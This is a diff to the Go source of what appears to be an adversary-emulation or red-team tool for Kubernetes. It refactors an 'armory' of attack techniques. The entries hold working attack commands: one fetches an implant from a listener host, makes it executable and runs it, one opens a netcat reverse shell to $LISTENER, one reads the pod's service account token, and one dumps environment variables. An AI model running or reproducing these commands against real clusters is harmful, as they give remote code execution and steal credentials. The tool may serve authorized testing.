@@ -69,10 +69,6 @@ type EstablishReverseShell struct {
 // 	}
 // }
 
-type KubectlExecCmd struct {
-	Cmd string
-}
-
 // func (c KubectlExecCmd) GetMessage() domain.Message {
 // 	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
 // }
@@ -128,7 +124,7 @@ func LoadArmory(dir string) (Armory, error) {
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
 			Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
+				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
@@ -136,8 +132,9 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:        "Read SerivceAccount Token",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			Cmd:         "get_file",
+			Args:        []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"},
 			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Args: []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"}, Target: domain.Target{}}
+				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Args: t.Args} // , Target: domain.Target{}
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserRead},
 			Effects:  []string{"Pod name", "ServiceAccount name", "Namespace name"},
@@ -152,7 +149,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Use kubectl exec to establish a simple shell",
 			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
 			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
+				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
 			},
 		},
 		// ExecSimpleReverseShell{
@@ -182,7 +179,7 @@ func LoadArmory(dir string) (Armory, error) {
 			ResultHandler: handleEnvVarResult,
 			Cmd:           "env",
 			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: domain.Target{}} //, C2Channel: KubectlExecCmd{}}
+				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
 			},
 		},
 	}
